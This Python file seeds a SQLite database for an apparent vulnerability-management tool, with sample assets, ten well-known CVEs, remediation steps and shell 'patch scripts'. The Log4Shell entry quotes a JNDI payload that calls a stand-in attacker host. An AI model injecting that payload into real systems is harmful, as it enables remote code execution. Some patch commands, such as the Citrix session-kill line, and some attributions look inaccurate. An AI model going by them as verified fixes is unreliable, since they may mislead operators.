import sqlite3
from pathlib import Path

DB_PATH = Path(__file__).parent / "cybershield.db"

def get_db_connection():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS assets (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT NOT NULL,
        ip_address TEXT NOT NULL,
        asset_type TEXT NOT NULL,
        os_info TEXT NOT NULL,
        criticality TEXT NOT NULL,
        exposure TEXT NOT NULL,
        owner TEXT NOT NULL,
        location TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    """)
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS vulnerabilities (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        cve_id TEXT NOT NULL,
        title TEXT NOT NULL,
        description TEXT NOT NULL,
        cvss_score REAL NOT NULL,
        cwe_id TEXT NOT NULL,
        epss_score REAL NOT NULL,
        exploit_available INTEGER NOT NULL,
        affected_component TEXT NOT NULL,
        remediation_steps TEXT NOT NULL,
        patch_script TEXT NOT NULL
    )
    """)
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS asset_vulnerabilities (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        asset_id INTEGER NOT NULL,
        vulnerability_id INTEGER NOT NULL,
        status TEXT NOT NULL DEFAULT 'OPEN',
        detected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (asset_id) REFERENCES assets (id),
        FOREIGN KEY (vulnerability_id) REFERENCES vulnerabilities (id)
    )
    """)
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        email TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        role TEXT NOT NULL DEFAULT 'SecOps Analyst',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    """)
    conn.commit()
    cursor.execute("SELECT COUNT(*) as count FROM assets")
    if cursor.fetchone()["count"] == 0:
        seed_database(conn)
    conn.close()

def seed_database(conn):
    cursor = conn.cursor()
    assets_data = [
        ("PROD-WEB-SERVER-01",     "10.0.1.50",    "Web Gateway / Nginx",      "Ubuntu 22.04 LTS",           "Mission Critical", "Internet Facing",       "DevOps Core Team",     "AWS us-east-1 / AZ-1a"),
        ("PROD-DB-POSTGRES-01",    "10.0.2.105",   "Database Cluster",         "RHEL 9.1 PostgreSQL 14.8",  "Mission Critical", "Internal Subnet",       "Data Admin Team",      "On-Prem Primary Vault"),
        ("CORP-CONFLUENCE-01",     "10.0.3.200",   "Collaboration Portal",     "Oracle Linux 8.8",          "High",             "Internet Facing",       "IT Operations",        "AWS eu-west-1 / AZ-1b"),
        ("CORP-CITRIX-GW-01",      "10.0.4.12",    "VPN / Remote Access GW",   "NetScaler 13.1",            "Mission Critical", "Internet Facing",       "Network SecOps",       "DMZ Edge PoP"),
        ("FIN-WIN-DC-01",          "172.16.0.5",   "Active Directory DC",      "Windows Server 2022",       "Mission Critical", "Internal Subnet",       "SecOps Team",          "HQ Datacenter Core"),
        ("SCADA-PLC-GATEWAY-09",   "172.16.80.4",  "Industrial IoT / OT",      "Embedded Linux 4.14",       "High",             "DMZ",                   "OT Infrastructure",    "Plant 4 Operational Zone"),
        ("STAGING-API-NODE-03",    "10.0.5.88",    "API Server / Node.js",     "Debian 12 / Node 20 LTS",   "Medium",           "DMZ",                   "Engineering QA",       "GCP us-central1"),
        ("DEV-BUILD-RUNNER-02",    "192.168.20.14", "CI/CD Agent / GitHub",    "Ubuntu 20.04 LTS",          "Medium",           "Internal Subnet",       "Developer Tooling",    "Office Sandbox"),
        ("INFRA-NET-FW-01",        "192.168.1.1",  "Perimeter Firewall",       "FortiOS 7.2 / FortiGate",   "Mission Critical", "Internet Facing",       "Network SecOps",       "HQ Datacenter Edge"),
        ("MAIL-EXCHANGE-01",       "10.0.6.44",    "Email / Exchange Server",  "Windows Server 2019",       "High",             "Internet Facing",       "IT Help Desk",         "AWS us-east-1 / AZ-1c"),
    ]
    cursor.executemany(
        "INSERT INTO assets (name, ip_address, asset_type, os_info, criticality, exposure, owner, location) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
        assets_data
    )
    vulns_data = [
        (
            "CVE-2023-22515",
            "Atlassian Confluence Broken Access Control — Admin Account Creation",
            "Unauthenticated remote attacker can create administrator account via exposed /setup/setupadministrator.action endpoint. Affects Confluence Data Center 8.x prior to patched builds.",
            10.0, "CWE-284 (Improper Access Control)", 0.974, 1,
            "Atlassian Confluence 8.0–8.5.x",
            "1. Immediately upgrade to Confluence 8.3.3, 8.4.3, or 8.5.2+. 2. Block /setup/* via WAF rule. 3. Audit all admin accounts created after exposure window. 4. Rotate all service account credentials.",
            "# Block Confluence setup endpoint immediately\nsudo nginx -t && cat >> /etc/nginx/snippets/security.conf << 'EOF'\nlocation ~ ^/setup/ {\n    deny all;\n    return 403 'Blocked by CyberShield AI';\n}\nEOF\nsudo nginx -s reload\n\n# Then upgrade Confluence\nwget https://www.atlassian.com/software/confluence/downloads/binary/atlassian-confluence-8.5.2.tar.gz\n# Follow upgrade guide: https://confluence.atlassian.com/doc/upgrading-confluence"
        ),
        (
            "CVE-2021-44228",
            "Apache Log4j2 JNDI Remote Code Execution (Log4Shell)",
            "Log4j2 JNDI lookup feature allows attacker to load arbitrary code from remote LDAP/RMI server via crafted log message containing ${jndi:ldap://attacker.com/exploit}. Full RCE with no authentication required.",
            10.0, "CWE-917 (JNDI Injection / Server-Side Template Injection)", 0.976, 1,
            "Apache Log4j-core 2.0-beta9 through 2.14.1",
            "1. Upgrade log4j-core to 2.17.1 (Java 8+) or 2.12.4 (Java 7). 2. Emergency: set JVM flag -Dlog4j2.formatMsgNoLookups=true. 3. Patch all Java runtimes. 4. Deploy WAF rules to block ${jndi: patterns in all inputs.",
            "# Emergency JVM flag mitigation\nexport JAVA_OPTS=\"$JAVA_OPTS -Dlog4j2.formatMsgNoLookups=true\"\n\n# Proper fix: upgrade log4j via Maven\nmvn versions:use-dep-version -Dincludes=org.apache.logging.log4j:log4j-core -DdepVersion=2.17.1\n\n# Or Gradle:\nimplementation 'org.apache.logging.log4j:log4j-core:2.17.1'\n\n# Scan for vulnerable JARs\nfind / -name 'log4j-core-*.jar' 2>/dev/null"
        ),
        (
            "CVE-2023-4966",
            "Citrix Bleed — NetScaler Buffer Overflow Session Token Leak",
            "Buffer overflow in Citrix NetScaler ADC/Gateway HTTP/S handling allows unauthenticated remote attacker to extract valid session tokens, bypassing MFA and enabling persistent unauthorized access.",
            9.4, "CWE-119 (Buffer Overflow)", 0.961, 1,
            "Citrix NetScaler ADC/Gateway 13.x, 12.x",
            "1. Upgrade NetScaler to 14.1-8.50+, 13.1-49.15+, or 13.0-92.19+. 2. Immediately kill all active sessions post-patch. 3. Rotate all service account tokens. 4. Review access logs for unauthorized session reuse.",
            "# Citrix CLI — terminate all active ICA sessions post-patch\nnsapimgr -ys kill_sessions=1\ncli> clear lb persistentSessions\ncli> save config\n\n# Check current version\ncli> show ns version\n\n# Upgrade via GUI or:\ncurl -O https://citrix.com/downloads/citrix-adc/firmware/..."
        ),
        (
            "CVE-2024-3094",
            "XZ Utils Supply Chain Backdoor — SSH Remote Code Execution",
            "Malicious code in XZ Utils 5.6.0-5.6.1 creates a backdoor in liblzma, which is linked by systemd into OpenSSH. Allows holder of specific Ed448 private key to execute arbitrary commands as root via SSH.",
            10.0, "CWE-506 (Embedded Malicious Code)", 0.944, 1,
            "XZ Utils 5.6.0-5.6.1 / liblzma / OpenSSH on systemd systems",
            "1. Downgrade xz-utils to 5.4.6 or earlier immediately. 2. Audit all SSH access logs for anomalous patterns. 3. Rotate all SSH host keys. 4. Check liblzma version: ldd /usr/sbin/sshd | grep liblzma.",
            "# Downgrade XZ Utils immediately\nsudo apt-get install --allow-downgrades xz-utils=5.4.6-0.2 liblzma5=5.4.6-0.2\n\n# Verify (should be 5.4.x)\nxz --version\n\n# Rotate SSH host keys\nsudo rm /etc/ssh/ssh_host_*\nsudo dpkg-reconfigure openssh-server\n\n# Check if backdoored\nldd /usr/sbin/sshd | grep liblzma"
        ),
        (
            "CVE-2022-22965",
            "Spring4Shell — Spring Framework Data Binder RCE",
            "Spring MVC or WebFlux application running on JDK 9+ with Tomcat allows remote code execution via manipulation of Spring DataBinder classloader leading to JSP webshell upload.",
            9.8, "CWE-94 (Code Injection)", 0.714, 1,
            "Spring Framework 5.3.x < 5.3.18, 5.2.x < 5.2.20",
            "1. Upgrade Spring Framework to 5.3.18+ or 5.2.20+. 2. Apply Spring Security patch. 3. If using Tomcat, upgrade to 10.0.20+, 9.0.62+, or 8.5.78+. 4. Restrict ClassLoader access via DisallowedFields configuration.",
            "# Maven upgrade\n<dependency>\n  <groupId>org.springframework</groupId>\n  <artifactId>spring-webmvc</artifactId>\n  <version>5.3.18</version>\n</dependency>\n\n# Gradle\nimplementation 'org.springframework:spring-webmvc:5.3.18'\n\n# Mitigating workaround (setDisallowedFields)\n@InitBinder\npublic void setAllowedFields(WebDataBinder dataBinder) {\n  dataBinder.setDisallowedFields(\"class.*\",\"Class.*\",\"*.class.*\",\"*.Class.*\");\n}"
        ),
        (
            "CVE-2023-38606",
            "Apple iOS/macOS Kernel Memory Corruption — Zero-Day",
            "Zero-day kernel vulnerability actively exploited by NSO Group Pegasus spyware. Allows privilege escalation and arbitrary kernel memory write via MMIO hardware registers.",
            9.8, "CWE-787 (Out-of-bounds Write)", 0.763, 1,
            "Apple iOS < 16.6, macOS < 13.5 Kernel / XNU",
            "1. Apply Apple security update macOS 13.5 / iOS 16.6 immediately. 2. Enable Lockdown Mode on high-risk devices. 3. Audit for Pegasus indicators via iMazing or MVT tool.",
            "# Check current macOS version\nsw_vers -productVersion\n\n# Apply all pending security updates\nsudo softwareupdate -i -a --restart\n\n# Scan for Pegasus IOCs using Mobile Verification Toolkit\npip install mvt\nmvt-ios check-backup /path/to/backup"
        ),
        (
            "CVE-2024-21762",
            "FortiOS SSL-VPN Out-of-Bounds Write — Unauthenticated RCE",
            "Critical out-of-bounds write vulnerability in FortiOS SSL VPN allows unauthenticated remote code execution. Actively exploited in the wild targeting government and enterprise infrastructure.",
            9.6, "CWE-787 (Out-of-bounds Write)", 0.912, 1,
            "FortiOS 7.x < 7.4.3, 7.2.x < 7.2.7, 6.4.x < 6.4.15",
            "1. Upgrade FortiOS to 7.4.3+, 7.2.7+, or 6.4.15+. 2. Disable SSL-VPN if not required (set vpn ssl settings status disable). 3. Review VPN access logs for IOCs. 4. Rotate all VPN credentials.",
            "# FortiOS CLI — disable SSL-VPN as emergency\nconfig vpn ssl settings\n    set status disable\nend\n\n# Or restrict to known source IPs:\nconfig firewall policy\n    edit <policy_id>\n        set srcaddr <trusted_ip_group>\n    next\nend\n\n# Verify firmware version\nget system status | grep 'Version'"
        ),
        (
            "CVE-2023-4863",
            "libwebp Heap Buffer Overflow — Remote Code Execution",
            "Heap buffer overflow in libwebp WebP image codec allows attacker to execute arbitrary code via crafted WebP image. Affects Chrome, Firefox, Electron, Node.js, and any app using libwebp < 1.3.2.",
            8.8, "CWE-122 (Heap-based Buffer Overflow)", 0.822, 1,
            "libwebp < 1.3.2 (Chrome, Firefox, Electron, Node.js apps)",
            "1. Upgrade libwebp to 1.3.2+ on all systems. 2. Rebuild all Docker images using updated base. 3. Update all Node.js/Electron apps. 4. Deploy Content Security Policy headers to limit image source origins.",
            "# Ubuntu/Debian\nsudo apt-get update && sudo apt-get install --only-upgrade libwebp7 libwebp-dev\n\n# RHEL/CentOS\nsudo dnf update libwebp\n\n# Node.js apps using sharp\nnpm update sharp\n\n# Docker rebuild\ndocker build --no-cache -t myapp:patched .\n\n# Verify fixed version\ndpkg -l libwebp7"
        ),
        (
            "CVE-2021-34527",
            "PrintNightmare — Windows Print Spooler RCE & LPE",
            "Windows Print Spooler service allows remote code execution and local privilege escalation. Unauthenticated attacker can install programs, modify data, and create new accounts with SYSTEM privileges.",
            8.8, "CWE-269 (Improper Privilege Management)", 0.881, 1,
            "Windows Print Spooler Service / All Windows versions",
            "1. Apply KB5004945 and subsequent patches immediately. 2. Disable Print Spooler on all non-printing servers (especially DCs). 3. Restrict printer driver installation via Group Policy. 4. Block inbound SMB/RPC at perimeter.",
            "# PowerShell — Disable Print Spooler on Domain Controllers\nStop-Service -Name Spooler -Force\nSet-Service -Name Spooler -StartupType Disabled\n\n# GPO registry key to disable printer driver installation:\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\" /v NoWarningNoElevationOnInstall /t REG_DWORD /d 0 /f\n\n# Check patch level\nGet-HotFix -Id KB5004945"
        ),
        (
            "CVE-2024-1709",
            "ConnectWise ScreenConnect Authentication Bypass — Mass Exploitation",
            "Critical authentication bypass vulnerability in ConnectWise ScreenConnect allowing unauthenticated access to administrative functions. Enables ransomware deployment. Actively exploited by LockBit, Bl00dy groups.",
            10.0, "CWE-288 (Authentication Bypass)", 0.933, 1,
            "ConnectWise ScreenConnect < 23.9.8",
            "1. Upgrade ScreenConnect to 23.9.8+ immediately (emergency patch). 2. If unable to patch, take system offline. 3. Audit all recent remote sessions for unauthorized access. 4. Check for dropped tools/persistence mechanisms.",
            "# Verify current ScreenConnect version\nGet-ItemProperty 'HKLM:\\SOFTWARE\\ScreenConnect Software\\ScreenConnect' | Select-Object Version\n\n# If compromised, check for persistence:\nGet-ScheduledTask | Where-Object { $_.Date -gt (Get-Date).AddDays(-7) }\nGet-LocalUser | Where-Object { $_.LastLogon -gt (Get-Date).AddDays(-1) }\n\n# Network indicators\nnetstat -an | findstr ':8040'"
        ),
    ]
    cursor.executemany(
        """INSERT INTO vulnerabilities
        (cve_id, title, description, cvss_score, cwe_id, epss_score, exploit_available, affected_component, remediation_steps, patch_script)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
        vulns_data
    )
    findings = [
        (3,  1, "OPEN"),
        (1,  2, "OPEN"),
        (4,  3, "OPEN"),
        (9,  7, "OPEN"),
        (2,  2, "OPEN"),
        (5,  9, "OPEN"),
        (6,  5, "OPEN"),
        (7,  8, "OPEN"),
        (1,  4, "OPEN"),
        (10, 9, "OPEN"),
        (3,  6, "OPEN"),
        (8,  8, "OPEN"),
        (4,  10, "OPEN"),
        (2,  1, "OPEN"),
    ]
    cursor.executemany(
        "INSERT INTO asset_vulnerabilities (asset_id, vulnerability_id, status) VALUES (?, ?, ?)",
        findings
    )
    conn.commit()

init_db()
